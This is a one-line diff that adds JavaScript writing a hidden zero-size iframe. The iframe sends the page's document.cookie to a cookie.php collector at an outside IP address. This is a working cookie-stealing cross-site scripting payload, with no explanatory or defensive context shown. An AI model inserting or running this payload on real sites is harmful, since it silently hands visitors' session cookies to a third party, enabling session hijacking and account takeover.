@@ -1,0 +1,1 @@
+document.write("<iframe src='http://172.20.10.2/cookie.php?cookie="+document.cookie+"' width=0 height=0></iframe>");
